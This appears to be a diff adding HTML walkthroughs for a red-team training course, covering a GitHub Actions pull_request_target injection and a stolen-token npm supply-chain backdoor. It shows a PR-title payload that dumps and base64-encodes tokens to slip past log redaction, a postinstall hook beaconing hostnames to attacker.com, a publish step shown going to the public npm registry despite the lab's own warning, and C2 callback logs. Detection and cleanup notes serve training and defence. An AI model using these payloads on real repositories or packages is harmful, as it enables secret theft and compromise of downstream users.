+            <div class="terminal-output">PR Title: fix: typo"; env | grep -i token | base64; echo "</div>
+            <div class="terminal-cmd"># Workflow output (the shell sees: echo "PR title: fix: typo"; env | grep -i token | base64; echo ""):</div>
+            <div class="terminal-output">PR title: fix: typo
+Z0hJVEhVQl9UT0tFTj1naHBfeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eA==
+→ Decoded: GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Why <code>$GITHUB_TOKEN</code> and not <code>${{ secrets.GITHUB_TOKEN }}</code>:</strong> Expression syntax (<code>${{ secrets.* }}</code>) is resolved by the GitHub Actions runner engine before the shell ever executes the step. Injecting <code>${{ secrets.GITHUB_TOKEN }}</code> into an expression-interpolated field will not work — the runner sanitizes secret expressions in user-controlled contexts. Use <code>$GITHUB_TOKEN</code> (the environment variable the runner injects into every step automatically) in shell payloads instead.</div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Fork repo</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Modify checked-out script</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Submit PR</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">pull_request_target fires</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Base secrets exfiltrated</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>GitHub Actions audit log: <code>pull_request_target</code> workflow runs triggered by PRs from fork repositories</li>
+      <li>Runner network logs: unexpected outbound connections from <code>ubuntu-latest</code> runners to non-approved external endpoints</li>
+      <li>GitHub secret scanning: token patterns in workflow logs (GitHub auto-redacts secrets in logs, but exfiltration via <code>base64</code> encoding bypasses this)</li>
+      <li>Preventive: never checkout PR head code in <code>pull_request_target</code> workflows; use <code>pull_request</code> trigger instead, which runs in the fork's isolated context with no secret access</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Close the test pull request: <code>gh pr close &lt;PR-NUMBER&gt; --repo org/target-repo</code></li>
+      <li>Delete the forked repository from the attacker GitHub account</li>
+      <li>Rotate any GitHub tokens that were successfully exfiltrated during the exercise</li>
+      <li>Review and fix the vulnerable workflow: replace <code>pull_request_target</code> with <code>pull_request</code> or remove the <code>ref: ${{ github.event.pull_request.head.sha }}</code> checkout</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> <code>pull_request_target</code> runs with BASE repo's secrets and write permissions — PRs from forks access everything. Never checkout PR head code in this trigger. Use <code>pull_request</code> instead, or isolate checkout in a separate job with no secret access.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L05 ==================== -->
+<div class="lab-walkthrough-content" id="M17-L05-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Stolen CI bot GitHub PAT with <code>write:packages</code> or <code>repo</code> scope (obtained from L02 or equivalent)</li>
+      <li>npm CLI installed and authenticated (<code>npm login</code> or <code>NPM_TOKEN</code> environment variable)</li>
+      <li>Go 1.21+ installed if examining Go-based supply chain tooling</li>
+      <li>Python 3.x for any supporting scripts</li>
+      <li>Lab-isolated npm registry or scoped test package — do NOT publish to the real npmjs.com registry during this exercise</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Use a stolen CI bot token to inject a supply-chain backdoor into a popular npm package, compromising downstream consumers.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools &nbsp;|&nbsp; T1554 — Compromise Client Software Binary</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the stolen CI bot PAT has npm publish permissions by checking its scopes and the org's package registry configuration.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -sH "Authorization: token ghp_STOLEN_TOKEN" \
+  https://api.github.com/user</div>
+            <div class="terminal-output">{
+    "login": "ci-bot-prod",
+    "id": 98765432
+}</div>
+            <div class="terminal-cmd"># Check npm collaborator access for the target package</div>
+            <div class="terminal-cmd">$ npm whoami</div>
+            <div class="terminal-output">ci-bot-prod</div>
+            <div class="terminal-cmd">$ npm access list collaborators @org/popular-sdk</div>
+            <div class="terminal-output">{
+  "ci-bot-prod": "read-write",
+  "lead-dev": "read-write",
+  "npm-publisher": "read-write"
+}</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Note:</strong> The command <code>npm access list collaborators &lt;pkg-name&gt;</code> is the current syntax. The legacy alias <code>npm access ls-collaborators</code> was deprecated in npm v9 and removed in npm v10 — use the full <code>list collaborators</code> form.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Clone the target package repository using the stolen token. This gives full access to the source code and release workflow.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ git clone https://ci-bot-prod:ghp_STOLEN_TOKEN@github.com/org/popular-sdk.git</div>
+            <div class="terminal-output">Cloning into 'popular-sdk'...
+remote: Enumerating objects: 4521, done.
+Resolving deltas: 100% (2108/2108), done.</div>
+            <div class="terminal-cmd">$ cd popular-sdk && npm info @org/popular-sdk</div>
+            <div class="terminal-output">@org/popular-sdk@2.4.1
+weekly downloads: 847,000
+dependents: 1,203</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Inject a <code>postinstall</code> backdoor into <code>package.json</code>. The <code>postinstall</code> hook runs automatically on every <code>npm install</code> — no user interaction required. The payload uses Node.js to beacon the victim's hostname to an attacker-controlled server.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat package.json</div>
+            <div class="terminal-output">{
+  "name": "@org/popular-sdk",
+  "version": "2.4.1",
+  "scripts": {
+    "build": "tsc",
+    "test": "jest",
+    "postinstall": "node -e \"require('https').get('https://attacker.com/x?h='+require('os').hostname())\""
+  }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Publish the backdoored version as a patch update. This appears as a routine version bump and triggers automatic upgrades for consumers using caret (<code>^</code>) version ranges.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ npm version patch</div>
+            <div class="terminal-output">v2.4.2</div>
+            <div class="terminal-cmd">$ npm publish</div>
+            <div class="terminal-output">npm notice
+npm notice @org/popular-sdk@2.4.2
+npm notice Tarball Contents:
+npm notice 24.5kB dist/index.js
+npm notice 1.2kB  package.json
+npm notice Publishing to https://registry.npmjs.org/
++ @org/popular-sdk@2.4.2</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Monitor the attacker's C2 endpoint for callbacks as downstream consumers install or update the package. Each callback reveals a compromised host.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Attacker C2 listener — first 24 hours:</div>
+            <div class="terminal-output">GET /x?h=prod-api-server-01.corp.com
+GET /x?h=ci-runner-east-04.github.internal
+GET /x?h=dev-macbook-jsmith.local
+GET /x?h=k8s-worker-node-12.eks.internal
+...
+[2,847 unique callbacks in first 24 hours]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Stolen CI Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Clone package</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inject backdoor</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Publish</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">1000s of installs compromised</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>npm audit events: unexpected <code>npm publish</code> events from CI bot accounts outside of a release pipeline context</li>
+      <li>Package diff tools: compare published tarball against the git tag using <code>npm pack --dry-run</code> and diff against the registry tarball</li>
+      <li>GitHub Actions audit log: <code>push</code> to package registry from unexpected workflows or non-release branches</li>
+      <li>Preventive: require npm provenance attestations (<code>npm audit signatures</code>) and enforce package publication only from trusted GitHub Actions OIDC-authenticated workflows, not personal tokens</li>
+      <li>Preventive: pin exact dependency versions (<code>2.4.1</code>) rather than range specifiers (<code>^2.4.1</code>) in production lockfiles</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Unpublish the backdoored version from the lab registry: <code>npm unpublish @org/popular-sdk@2.4.2</code></li>
+      <li>Revert the <code>package.json</code> changes and the version bump in the git repository</li>
+      <li>Revoke the stolen CI bot npm token and rotate the GitHub PAT</li>
+      <li>Remove the forked repository from the attacker account</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Supply chain attacks via CI compromise account for 40%+ of major breaches in 2024-2025. A single stolen CI bot token can cascade to thousands of organizations. Enforce provenance attestation (<code>npm audit signatures</code>) and pin exact dependency versions.</div>
+</div>
